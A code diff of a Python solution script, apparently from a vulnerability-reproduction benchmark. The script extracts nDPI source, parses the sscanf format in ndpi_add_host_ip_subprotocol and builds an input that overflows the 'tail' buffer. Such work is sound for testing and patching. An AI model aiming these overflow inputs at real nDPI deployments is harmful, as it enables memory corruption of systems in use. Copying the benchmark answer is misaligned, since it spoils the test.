@@ -1,482 +1,536 @@
 import os
 import re
+import tarfile
+import tempfile
+import shutil
 
 
-class Spec:
-    def __init__(self, start, end, suppressed, conv, width, scanset, consumes_input):
-        self.start = start
-        self.end = end
-        self.suppressed = suppressed
-        self.conv = conv
-        self.width = width
-        self.scanset = scanset
-        self.consumes_input = consumes_input
+def remove_comments(code: str) -> str:
+    res = []
+    i = 0
+    n = len(code)
+    state = 'code'
+    string_quote = ''
+    while i < n:
+        ch = code[i]
+        if state == 'code':
+            if ch == '"':
+                res.append(ch)
+                state = 'string'
+                string_quote = '"'
+                i += 1
+            elif ch == "'":
+                res.append(ch)
+                state = 'char'
+                string_quote = "'"
+                i += 1
+            elif ch == '/' and i + 1 < n and code[i + 1] == '/':
+                state = 'line_comment'
+                i += 2
+            elif ch == '/' and i + 1 < n and code[i + 1] == '*':
+                state = 'block_comment'
+                i += 2
+            else:
+                res.append(ch)
+                i += 1
+        elif state == 'string':
+            res.append(ch)
+            if ch == '\\' and i + 1 < n:
+                res.append(code[i + 1])
+                i += 2
+            elif ch == string_quote:
+                state = 'code'
+                i += 1
+            else:
+                i += 1
+        elif state == 'char':
+            res.append(ch)
+            if ch == '\\' and i + 1 < n:
+                res.append(code[i + 1])
+                i += 2
+            elif ch == string_quote:
+                state = 'code'
+                i += 1
+            else:
+                i += 1
+        elif state == 'line_comment':
+            if ch == '\n':
+                res.append(ch)
+                state = 'code'
+            i += 1
+        elif state == 'block_comment':
+            if ch == '*' and i + 1 < n and code[i + 1] == '/':
+                i += 2
+                state = 'code'
+            else:
+                i += 1
+    return ''.join(res)
+
+
+def find_matching_paren(s: str, start: int) -> int:
+    depth = 1
+    i = start + 1
+    n = len(s)
+    in_str = False
+    in_char = False
+    escape = False
+    quote = ''
+    while i < n:
+        ch = s[i]
+        if in_str:
+            if escape:
+                escape = False
+            elif ch == '\\':
+                escape = True
+            elif ch == quote:
+                in_str = False
+            i += 1
+            continue
+        if in_char:
+            if escape:
+                escape = False
+            elif ch == '\\':
+                escape = True
+            elif ch == "'":
+                in_char = False
+            i += 1
+            continue
+        if ch == '"':
+            in_str = True
+            quote = '"'
+            i += 1
+            continue
+        if ch == "'":
+            in_char = True
+            i += 1
+            continue
+        if ch == '(':
+            depth += 1
+        elif ch == ')':
+            depth -= 1
+            if depth == 0:
+                return i
+        i += 1
+    return -1
+
+
+def find_matching_brace(s: str, start: int) -> int:
+    depth = 1
+    i = start + 1
+    n = len(s)
+    in_str = False
+    in_char = False
+    escape = False
+    quote = ''
+    while i < n:
+        ch = s[i]
+        if in_str:
+            if escape:
+                escape = False
+            elif ch == '\\':
+                escape = True
+            elif ch == quote:
+                in_str = False
+            i += 1
+            continue
+        if in_char:
+            if escape:
+                escape = False
+            elif ch == '\\':
+                escape = True
+            elif ch == "'":
+                in_char = False
+            i += 1
+            continue
+        if ch == '"':
+            in_str = True
+            quote = '"'
+            i += 1
+            continue
+        if ch == "'":
+            in_char = True
+            i += 1
+            continue
+        if ch == '{':
+            depth += 1
+        elif ch == '}':
+            depth -= 1
+            if depth == 0:
+                return i
+        i += 1
+    return -1
+
+
+def get_function_body(code_clean: str, func_name: str) -> str:
+    pattern = func_name + '('
+    pos = code_clean.find(pattern)
+    n = len(code_clean)
+    while pos != -1:
+        open_paren = pos + len(func_name)
+        if open_paren >= n or code_clean[open_paren] != '(':
+            pos = code_clean.find(pattern, pos + 1)
+            continue
+        close_paren = find_matching_paren(code_clean, open_paren)
+        if close_paren == -1:
+            break
+        j = close_paren + 1
+        while j < n and code_clean[j].isspace():
+            j += 1
+        if j < n and code_clean[j] == '{':
+            body_start = j
+            body_end = find_matching_brace(code_clean, body_start)
+            if body_end != -1:
+                return code_clean[body_start:body_end + 1]
+        pos = code_clean.find(pattern, pos + 1)
+    return ""
+
+
+def split_top_level_commas(text: str):
+    args = []
+    current = []
+    depth = 0
+    in_string = False
+    in_char = False
+    escape = False
+    string_char = ''
+    for ch in text:
+        if in_string:
+            current.append(ch)
+            if escape:
+                escape = False
+            elif ch == '\\':
+                escape = True
+            elif ch == string_char:
+                in_string = False
+            continue
+        if in_char:
+            current.append(ch)
+            if escape:
+                escape = False
+            elif ch == '\\':
+                escape = True
+            elif ch == "'":
+                in_char = False
+            continue
+        if ch == '"':
+            in_string = True
+            string_char = '"'
+            current.append(ch)
+            continue
+        if ch == "'":
+            in_char = True
+            escape = False
+            current.append(ch)
+            continue
+        if ch == '(':
+            depth += 1
+            current.append(ch)
+            continue
+        if ch == ')':
+            depth -= 1
+            current.append(ch)
+            continue
+        if ch == ',' and depth == 0:
+            arg = ''.join(current).strip()
+            if arg:
+                args.append(arg)
+            current = []
+            continue
+        current.append(ch)
+    last = ''.join(current).strip()
+    if last:
+        args.append(last)
+    return args
+
+
+def eval_c_string_literal(expr: str) -> str:
+    s = expr.strip()
+    result_chars = []
+    i = 0
+    n = len(s)
+    while i < n:
+        while i < n and s[i].isspace():
+            i += 1
+        if i >= n:
+            break
+        # handle prefixes: L, u, U, u8
+        if s[i] in ('L', 'U'):
+            i += 1
+        elif s[i] == 'u':
+            if i + 1 < n and s[i + 1] == '8':
+                i += 2
+            else:
+                i += 1
+        if i >= n or s[i] != '"':
+            break
+        i += 1  # skip opening "
+        chunk_chars = []
+        escape = False
+        while i < n:
+            ch = s[i]
+            if escape:
+                if ch == 'n':
+                    chunk_chars.append('\n')
+                elif ch == 't':
+                    chunk_chars.append('\t')
+                elif ch == 'r':
+                    chunk_chars.append('\r')
+                elif ch == '\\':
+                    chunk_chars.append('\\')
+                elif ch == '"':
+                    chunk_chars.append('"')
+                elif ch == "'":
+                    chunk_chars.append("'")
+                elif ch == '0':
+                    chunk_chars.append('\0')
+                else:
+                    chunk_chars.append(ch)
+                escape = False
+            else:
+                if ch == '\\':
+                    escape = True
+                elif ch == '"':
+                    i += 1
+                    break
+                else:
+                    chunk_chars.append(ch)
+            i += 1
+        result_chars.extend(chunk_chars)
+    return ''.join(result_chars)
+
+
+def parse_scanset(raw: str):
+    chars = set()
+    i = 0
+    n = len(raw)
+    while i < n:
+        c = raw[i]
+        if i + 2 < n and raw[i + 1] == '-' and raw[i + 2] != ']':
+            start = ord(c)
+            end = ord(raw[i + 2])
+            if start <= end:
+                rng = range(start, end + 1)
+            else:
+                rng = range(end, start + 1)
+            for code in rng:
+                chars.add(chr(code))
+            i += 3
+        else:
+            chars.add(c)
+            i += 1
+    return chars
+
+
+def choose_char_in_set(char_set):
+    for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_./:-':
+        if c in char_set:
+            return c
+    if char_set:
+        return next(iter(char_set))
+    return 'A'
+
+
+def choose_char_not_in_set(char_set):
+    for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_./:-':
+        if c not in char_set:
+            return c
+    return 'Z'
+
+
+def build_token_for_conv(spec, width, raw_set, scanset_negated, is_tail, tail_size):
+    if spec in 'diuoxX':
+        return '1'
+    if spec in 'fFeEgGaA':
+        return '1.0'
+    if spec in 'p':
+        return '0'
+    if spec == 'n':
+        return ''
+    if spec == 's':
+        if is_tail:
+            if width is None:
+                length = max(tail_size, 64)
+            else:
+                length = max(width, tail_size, 64)
+        else:
+            length = 1
+        return 'T' * length
+    if spec == 'c':
+        if width is None:
+            length = 1
+        else:
+            length = width
+        if is_tail and width is not None and width <= tail_size:
+            length = tail_size + 1
+        return 'C' * length
+    if spec == '[':
+        if raw_set is None:
+            base_char = 'A'
+        else:
+            char_set = parse_scanset(raw_set)
+            if scanset_negated:
+                base_char = choose_char_not_in_set(char_set)
+            else:
+                base_char = choose_char_in_set(char_set)
+        if is_tail:
+            if width is None:
+                length = max(tail_size, 64)
+            else:
+                length = max(width, tail_size, 64)
+        else:
+            length = 1
+        return base_char * length
+    # Default fallback
+    return '1'
+
+
+def generate_input_from_fmt(fmt: str, tail_size: int, tail_assignment_index: int) -> bytes:
+    out_parts = []
+    i = 0
+    n = len(fmt)
+    assignment_index = -1
+    while i < n:
+        ch = fmt[i]
+        if ch == '%':
+            i += 1
+            if i < n and fmt[i] == '%':
+                out_parts.append('%')
+                i += 1
+                continue
+            suppress = False
+            width = None
+            if i < n and fmt[i] == '*':
+                suppress = True
+                i += 1
+            wstart = i
+            while i < n and fmt[i].isdigit():
+                i += 1
+            if i > wstart:
+                try:
+                    width = int(fmt[wstart:i])
+                except ValueError:
+                    width = None
+            # length modifiers
+            while i < n and fmt[i] in 'hlLjzt':
+                i += 1
+            if i >= n:
+                break
+            spec = fmt[i]
+            i += 1
+            raw_set = None
+            scanset_negated = False
+            if spec == '[':
+                if i < n and fmt[i] == '^':
+                    scanset_negated = True
+                    i += 1
+                raw_chars = []
+                if i < n and fmt[i] == ']':
+                    raw_chars.append(']')
+                    i += 1
+                while i < n and fmt[i] != ']':
+                    raw_chars.append(fmt[i])
+                    i += 1
+                if i < n and fmt[i] == ']':
+                    i += 1
+                raw_set = ''.join(raw_chars)
+            if not suppress:
+                assignment_index += 1
+            is_tail = (not suppress and assignment_index == tail_assignment_index)
+            token = build_token_for_conv(spec, width, raw_set, scanset_negated, is_tail, tail_size)
+            if token:
+                out_parts.append(token)
+        elif ch.isspace():
+            if not out_parts or not out_parts[-1].endswith(' '):
+                out_parts.append(' ')
+            i += 1
+        else:
+            out_parts.append(ch)
+            i += 1
+    out_str = ''.join(out_parts)
+    out_str = out_str.strip('\r')
+    if not out_str.endswith('\n'):
+        out_str += '\n'
+    return out_str.encode('ascii', errors='ignore')
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
+        tmpdir = tempfile.mkdtemp(prefix="ndpi_poc_")
         try:
-            poc = self._generate_poc(src_path)
-            if poc:
-                return poc
-        except Exception:
-            pass
-        return self._fallback_poc()
-
-    # Top-level PoC generation
-    def _generate_poc(self, src_path: str) -> bytes:
-        ndpi_main_path = self._find_file(src_path, "ndpi_main.c")
-        if not ndpi_main_path:
-            return None
-
-        try:
-            text = self._read_file(ndpi_main_path)
-        except Exception:
-            return None
-
-        func_body = self._extract_function_body(text, "ndpi_add_host_ip_subprotocol")
-        if not func_body:
-            return None
-
-        tail_size = self._extract_tail_size(func_body)
-        if not tail_size:
-            tail_size = 16  # conservative default
-
-        sscanf_calls = self._find_sscanf_calls_with_tail(func_body)
-        if not sscanf_calls:
-            return None
-
-        poc_lines = []
-
-        for call_str in sscanf_calls:
-            info = self._parse_sscanf_call(call_str)
-            if not info:
-                continue
-            fmt = info["fmt"]
-            args = info["args"]
-
-            specs = self._parse_scanf_format(fmt)
-            if not specs:
-                continue
-
-            target_info = self._locate_tail_spec(args, specs)
-            if not target_info:
-                continue
-
-            tail_global_idx = target_info["tail_global_idx"]
-
-            tokens = self._build_tokens_for_specs(
-                specs=specs,
-                tail_global_idx=tail_global_idx,
-                tail_size=tail_size,
-            )
-
-            line = self._build_input_from_format(fmt, specs, tokens)
-            if not line:
-                continue
-
-            if not line.endswith("\n"):
-                line += "\n"
-            poc_lines.append(line)
-
-        if not poc_lines:
-            return None
-
-        poc_text = "".join(poc_lines)
-        return poc_text.encode("ascii", errors="replace")
-
-    # Helper: find file recursively
-    def _find_file(self, root: str, filename: str):
-        for dirpath, _, filenames in os.walk(root):
-            if filename in filenames:
-                return os.path.join(dirpath, filename)
-        return None
-
-    # Helper: read file as text
-    def _read_file(self, path: str) -> str:
-        with open(path, "r", encoding="utf-8", errors="ignore") as f:
-            return f.read()
-
-    # Helper: extract C function body by name
-    def _extract_function_body(self, text: str, func_name: str):
-        m = re.search(r"\b%s\s*\(" % re.escape(func_name), text)
-        if not m:
-            return None
-        idx = m.end()
-        n = len(text)
-        while idx < n and text[idx] != "{":
-            idx += 1
-        if idx >= n or text[idx] != "{":
-            return None
-        start = idx
-        depth = 0
-        i = start
-        while i < n:
-            c = text[i]
-            if c == "{":
-                depth += 1
-            elif c == "}":
-                depth -= 1
-                if depth == 0:
-                    return text[start : i + 1]
-            i += 1
-        return None
-
-    # Helper: extract tail buffer size from declaration
-    def _extract_tail_size(self, func_body: str):
-        # Prefer direct "char tail[NN]"
-        m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", func_body)
-        if m:
             try:
-                return int(m.group(1))
-            except ValueError:
-                pass
-        # Fallback: any "tail[NN]"
-        m = re.search(r"\btail\s*\[\s*(\d+)\s*\]", func_body)
-        if m:
-            try:
-                return int(m.group(1))
-            except ValueError:
-                pass
-        return None
+                with tarfile.open(src_path, 'r:*') as tf:
+                    tf.extractall(tmpdir)
+            except Exception:
+                return b'A' * 1024
 
-    # Helper: find all sscanf calls that reference 'tail'
-    def _find_sscanf_calls_with_tail(self, func_body: str):
-        calls = []
-        for m in re.finditer(r"\bsscanf\s*\(", func_body):
-            start = m.start()
-            paren_start = func_body.find("(", start)
-            if paren_start == -1:
-                continue
-            paren_end = self._match_paren(func_body, paren_start)
-            if paren_end == -1:
-                continue
-            call_str = func_body[start : paren_end + 1]
-            if "tail" in call_str:
-                calls.append(call_str)
-        return calls
-
-    # Helper: match parentheses, return index of matching ')'
-    def _match_paren(self, text: str, pos: int):
-        depth = 0
-        n = len(text)
-        for i in range(pos, n):
-            c = text[i]
-            if c == "(":
-                depth += 1
-            elif c == ")":
-                depth -= 1
-                if depth == 0:
-                    return i
-        return -1
-
-    # Helper: split function-call argument list string into arguments
-    def _split_arguments(self, s: str):
-        args = []
-        cur = []
-        depth = 0
-        in_single = False
-        in_double = False
-        escape = False
-
-        for ch in s:
-            if escape:
-                cur.append(ch)
-                escape = False
-                continue
-            if ch == "\\":
-                escape = True
-                cur.append(ch)
-                continue
-
-            if in_single:
-                cur.append(ch)
-                if ch == "'":
-                    in_single = False
-                continue
-
-            if in_double:
-                cur.append(ch)
-                if ch == '"':
-                    in_double = False
-                continue
-
-            if ch == "'":
-                in_single = True
-                cur.append(ch)
-                continue
-            if ch == '"':
-                in_double = True
-                cur.append(ch)
-                continue
-
-            if ch == "(":
-                depth += 1
-                cur.append(ch)
-                continue
-            if ch == ")":
-                depth -= 1
-                cur.append(ch)
-                continue
-
-            if ch == "," and depth == 0:
-                arg = "".join(cur).strip()
-                if arg:
-                    args.append(arg)
-                cur = []
-                continue
-
-            cur.append(ch)
-
-        last = "".join(cur).strip()
-        if last:
-            args.append(last)
-        return args
-
-    # Helper: decode (possibly simple) C string literal from argument
-    def _extract_c_string(self, s: str):
-        # Support simple concatenation: "foo" "bar"
-        res_parts = []
-        n = len(s)
-        i = 0
-        while i < n:
-            while i < n and s[i] != '"':
-                i += 1
-            if i >= n or s[i] != '"':
-                break
-            i += 1  # skip opening quote
-            part = []
-            escape = False
-            while i < n:
-                ch = s[i]
-                if escape:
-                    if ch == "n":
-                        part.append("\n")
-                    elif ch == "t":
-                        part.append("\t")
-                    elif ch == "r":
-                        part.append("\r")
-                    elif ch == "b":
-                        part.append("\b")
-                    elif ch == "f":
-                        part.append("\f")
-                    elif ch == "a":
-                        part.append("\a")
-                    elif ch == "\\":
-                        part.append("\\")
-                    elif ch == '"':
-                        part.append('"')
-                    elif ch == "'":
-                        part.append("'")
-                    elif ch == "0":
-                        part.append("\x00")
-                    else:
-                        part.append(ch)
-                    escape = False
-                    i += 1
-                    continue
-                if ch == "\\":
-                    escape = True
-                    i += 1
-                    continue
-                if ch == '"':
-                    i += 1
+            ndpi_main_path = None
+            for root, _, files in os.walk(tmpdir):
+                for name in files:
+                    if name == 'ndpi_main.c':
+                        ndpi_main_path = os.path.join(root, name)
+                        break
+                if ndpi_main_path is not None:
                     break
-                part.append(ch)
-                i += 1
-            res_parts.append("".join(part))
-            # skip whitespace before possible next concatenated literal
-            while i < n and s[i].isspace():
-                i += 1
-            if i < n and s[i] == '"':
-                continue
-            else:
-                break
-        if not res_parts:
-            return None
-        return "".join(res_parts)
 
-    # Helper: parse one sscanf call string
-    def _parse_sscanf_call(self, call_str: str):
-        paren_start = call_str.find("(")
-        if paren_start == -1 or not call_str.endswith(")"):
-            return None
-        inner = call_str[paren_start + 1 : -1]
-        args = self._split_arguments(inner)
-        if len(args) < 3:
-            return None
-        fmt = self._extract_c_string(args[1])
-        if fmt is None:
-            return None
-        return {"args": args, "fmt": fmt}
+            if ndpi_main_path is None:
+                return b'A' * 1024
 
-    # Helper: parse scanf format string into Spec objects
-    def _parse_scanf_format(self, fmt: str):
-        specs = []
-        i = 0
-        n = len(fmt)
-        while i < n:
-            ch = fmt[i]
-            if ch != "%":
-                i += 1
-                continue
-            if i + 1 < n and fmt[i + 1] == "%":
-                # literal '%'
-                i += 2
-                continue
-            start = i
-            j = i + 1
-            suppressed = False
-            if j < n and fmt[j] == "*":
-                suppressed = True
-                j += 1
-            # width
-            width_str = ""
-            while j < n and fmt[j].isdigit():
-                width_str += fmt[j]
-                j += 1
-            width = int(width_str) if width_str else None
-            # length modifiers
-            while j < n and fmt[j] in "hljztL":
-                j += 1
-            if j >= n:
-                break
-            conv_char = fmt[j]
-            scanset = None
-            end = j
-            if conv_char == "[":
-                k = j + 1
-                while k < n and fmt[k] != "]":
-                    k += 1
-                end = k if k < n else n - 1
-                scanset = fmt[j + 1 : end]
-            consumes_input = conv_char != "n"
-            specs.append(Spec(start=start, end=end, suppressed=suppressed, conv=conv_char, width=width, scanset=scanset, consumes_input=consumes_input))
-            i = end + 1
-        return specs
+            try:
+                with open(ndpi_main_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    code = f.read()
+            except Exception:
+                return b'A' * 1024
 
-    # Helper: locate which format spec corresponds to 'tail' argument
-    def _locate_tail_spec(self, args, specs):
-        # arguments: [str, fmt, arg0, arg1, ...]
-        target_arg_index = None
-        for idx, arg in enumerate(args[2:], start=2):
-            if re.search(r"\btail\b", arg):
-                target_arg_index = idx
-                break
-        if target_arg_index is None:
-            return None
-        spec_arg_index = target_arg_index - 2
-        # specs that correspond to actual arguments (non-suppressed)
-        arg_spec_indices = [i for i, sp in enumerate(specs) if not sp.suppressed]
-        if spec_arg_index < 0 or spec_arg_index >= len(arg_spec_indices):
-            return None
-        tail_global_idx = arg_spec_indices[spec_arg_index]
-        return {"tail_global_idx": tail_global_idx}
+            code_clean = remove_comments(code)
+            func_body = get_function_body(code_clean, 'ndpi_add_host_ip_subprotocol')
+            if not func_body:
+                func_body = code_clean
 
-    # Helper: choose a character acceptable for a scanf scanset
-    def _choose_char_for_scanset(self, scanset: str):
-        if not scanset:
-            return "A"
-        complement = False
-        s = scanset
-        if s[0] == "^":
-            complement = True
-            s = s[1:]
+            tail_size = None
+            m = re.search(r'\b(?:unsigned\s+)?char\s+tail\s*\[\s*(\d+)\s*\]', func_body)
+            if m:
+                try:
+                    tail_size = int(m.group(1))
+                except Exception:
+                    tail_size = None
+            if tail_size is None:
+                tail_size = 64
 
-        def in_set(ch: str) -> bool:
-            i = 0
-            ln = len(s)
-            while i < ln:
-                c1 = s[i]
-                if i + 2 < ln and s[i + 1] == "-":
-                    c2 = s[i + 2]
-                    if c1 <= ch <= c2:
-                        return True
-                    i += 3
-                else:
-                    if ch == c1:
-                        return True
-                    i += 1
-            return False
+            search_idx = 0
+            fmt = None
+            tail_assignment_idx = None
+            while True:
+                pos = func_body.find('sscanf', search_idx)
+                if pos == -1:
+                    break
+                open_paren = func_body.find('(', pos)
+                if open_paren == -1:
+                    break
+                close_paren = find_matching_paren(func_body, open_paren)
+                if close_paren == -1:
+                    break
+                call_inside = func_body[open_paren + 1:close_paren]
+                args = split_top_level_commas(call_inside)
+                if len(args) >= 3:
+                    arg_exprs = args[2:]
+                    for idx, arg in enumerate(arg_exprs):
+                        if re.search(r'\btail\b', arg):
+                            fmt_expr = args[1]
+                            fmt_str = eval_c_string_literal(fmt_expr)
+                            if fmt_str:
+                                fmt = fmt_str
+                                tail_assignment_idx = idx
+                                break
+                if fmt is not None:
+                    break
+                search_idx = close_paren + 1
 
-        candidates = ["A", "a", "0", "1", "9", ".", ":", "/", "-", "_", " "]
-        for ch in candidates:
-            inside = in_set(ch)
-            allowed = (not inside) if complement else inside
-            if allowed:
-                return ch
-        return "A"
+            if fmt is None or tail_assignment_idx is None:
+                return b'A' * 1024
 
-    # Helper: build tokens for each format spec
-    def _build_tokens_for_specs(self, specs, tail_global_idx: int, tail_size: int):
-        tokens = [""] * len(specs)
-        # Choose a sufficiently large length to overflow original tail buffer
-        tail_len = max(tail_size * 4, tail_size + 64, 64)
-
-        for idx, sp in enumerate(specs):
-            if not sp.consumes_input:
-                tokens[idx] = ""
-                continue
-
-            if sp.conv == "[":
-                ch = self._choose_char_for_scanset(sp.scanset)
-            elif sp.conv == "s":
-                ch = "A"
-            elif sp.conv == "c":
-                ch = "C"
-            elif sp.conv in "diuoxXp":
-                ch = "1"
-            elif sp.conv in "fFeEgGaA":
-                ch = "1"
-            else:
-                ch = "1"
-
-            if idx == tail_global_idx:
-                length = tail_len
-            else:
-                if sp.width is not None and sp.width > 0:
-                    max_len = sp.width
-                else:
-                    max_len = 3
-                if max_len <= 0:
-                    max_len = 1
-                length = min(max_len, 3)
-                if length <= 0:
-                    length = 1
-
-            tokens[idx] = ch * length
-        return tokens
-
-    # Helper: build an input string from format and tokens
-    def _build_input_from_format(self, fmt: str, specs, tokens):
-        out = []
-        i = 0
-        n = len(fmt)
-        spec_idx = 0
-        while i < n:
-            ch = fmt[i]
-            if ch != "%":
-                out.append(ch)
-                i += 1
-                continue
-            # handle literal %%
-            if i + 1 < n and fmt[i + 1] == "%":
-                out.append("%")
-                i += 2
-                continue
-            if spec_idx >= len(specs):
-                # malformed; bail
-                i += 1
-                continue
-            sp = specs[spec_idx]
-            token = tokens[spec_idx] if spec_idx < len(tokens) else ""
-            out.append(token)
-            i = sp.end + 1
-            spec_idx += 1
-        return "".join(out)
-
-    # Fallback PoC if parsing fails
-    def _fallback_poc(self) -> bytes:
-        # Generic guess: a line with multiple fields and a long tail
-        line = "1,1,1,1,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
-        return line.encode("ascii", errors="replace")
+            payload = generate_input_from_fmt(fmt, tail_size, tail_assignment_idx)
+            if not payload:
+                payload = b'A' * 1024
+            return payload
+        finally:
+            shutil.rmtree(tmpdir, ignore_errors=True)
